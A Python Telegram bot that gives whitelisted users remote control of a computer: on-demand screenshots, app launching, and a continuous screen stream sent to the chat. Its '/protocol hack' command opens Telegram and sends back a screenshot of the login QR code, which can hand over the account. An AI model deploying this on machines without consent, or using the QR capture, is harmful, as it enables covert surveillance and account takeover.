import logging
import aiogram
import os
from aiogram.types import InputMediaPhoto, InputFile
import time
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from CONSTS import TOKEN, ACCESS_ID

from commads import screenshot, start_app

# Настройки логирования
logging.basicConfig(level=logging.INFO)

# Создаем экземпляр бота и диспетчера
bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


class AuthStates(StatesGroup):
    authorized = State()


# Обработчик команды /start
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    if str(message.from_user.id) in ACCESS_ID:
        await message.answer("success")
        await AuthStates.authorized.set()
    else:
        await message.answer("access denied")


@dp.message_handler(commands=['screenshot'], state=AuthStates.authorized)
async def send_screenshot(message: types.Message):
    place = message.text.split()[1]
    name = screenshot(place)
    photo = open(name, 'rb')
    await bot.send_photo(message.chat.id, photo)
    os.remove(name)


@dp.message_handler(commands=['start_app'], state=AuthStates.authorized)
async def start_app_mac(message: types.Message):
    app = message.text.split()[1]
    name = start_app(app)
    await message.answer(name)


@dp.message_handler(commands=['protocol'], state=AuthStates.authorized)
async def start_protocol(message: types.Message):
    protocol_name = message.text.split()[1]
    if protocol_name == 'hack':
        start_app('telegram')
        name = screenshot('qr_tg')
        photo = open(name, 'rb')
        await bot.send_photo(message.chat.id, photo)
        os.remove(name)


@dp.message_handler(commands=['stream'], state=AuthStates.authorized)
async def video_feed(message: types.Message):
        name = screenshot('all')
        photo = open(name, 'rb')
        await bot.send_photo(message.chat.id, photo, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('Start stream', callback_data='start_stream')).add(InlineKeyboardButton('Cancel', callback_data='cancel')))
        os.remove(name)


#callbacks
@dp.callback_query_handler(lambda query: query.data == 'start_stream', state=AuthStates.authorized)
async def start_stream(callback: types.CallbackQuery):
    print('Starting stream')
    while True:
        name = screenshot('all')
        await callback.message.edit_media(InputMediaPhoto(media=InputFile('./' + name)))
        os.remove(name)




# Запуск бота
if __name__ == '__main__':
    aiogram.executor.start_polling(dp, skip_updates=True)
